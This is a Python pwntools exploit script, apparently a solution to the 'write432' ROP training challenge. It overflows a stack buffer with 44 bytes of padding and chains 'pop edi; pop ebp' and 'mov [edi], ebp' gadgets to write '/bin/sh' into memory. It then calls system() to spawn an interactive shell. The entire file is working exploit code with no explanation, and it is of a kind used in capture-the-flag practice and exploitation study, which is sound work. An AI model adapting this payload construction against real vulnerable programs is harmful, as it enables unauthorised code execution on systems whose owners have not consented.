from pwn import *

p = process('./write432')

system = 0x8048430
buffer = 0x0804a028

string = '/bin/sh\x00'

# pop edi; pop ebp; ret;
gadget1 = 0x080486da
# mov dword ptr [edi], ebp; ret
gadget2 = 0x08048670

payload = 'a' * 44
payload += p32(gadget1)
payload += p32(buffer)
payload += string[0:4]

payload += p32(gadget2)

payload += p32(gadget1)
payload += p32(buffer+4)
payload += string[4:]

payload += p32(gadget2)

payload += p32(system)
payload += 'cccc'
payload += p32(buffer)

p.sendline(payload)
p.interactive()
